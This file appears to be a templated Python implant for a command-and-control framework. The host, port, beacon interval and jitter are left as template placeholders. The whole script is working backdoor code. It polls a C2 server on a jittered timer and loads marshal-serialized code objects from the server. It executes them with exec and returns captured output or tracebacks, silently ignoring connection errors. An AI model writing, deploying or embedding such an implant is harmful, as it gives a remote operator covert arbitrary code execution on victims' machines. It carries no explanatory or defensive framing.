import socket
import time
import base64
import sys
from io import StringIO
import traceback
import builtins
import random
import marshal

execution_context = {'__builtins__': builtins}

IP = '{{ c2.host }}'
PORT = {{ c2.port }}
FREQ = {{ c2.freq }}
JITTER = {{ c2.jitter }}

def wait():
    waiting_time = FREQ + random.uniform(-JITTER, JITTER)
    time.sleep(waiting_time)


def beacon(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(1)
    try:
        client_socket.connect((host, port))
        client_socket.send(b"get_instructions")
        
        instructions = client_socket.recv(1024)
        if instructions:
            instructions = marshal.loads(instructions)
            stdout_buffer = StringIO()
            stderr_buffer = StringIO()

            sys.stdout = stdout_buffer
            sys.stderr = stderr_buffer
            try:
                exec(instructions, execution_context)
                stdout_output = stdout_buffer.getvalue()
                stderr_output = stderr_buffer.getvalue()
                client_socket.send(stdout_output.encode())
                client_socket.send(stderr_output.encode())
                
            except Exception as e:
                traceback_buffer = StringIO()
                traceback.print_exc(file=traceback_buffer)
                traceback_output = traceback_buffer.getvalue()
                client_socket.send(traceback_output.encode())
    except ConnectionRefusedError:
        pass
    except Exception as e:
        pass
    finally:
        client_socket.close()

while True:
    beacon(IP, PORT)
    wait()
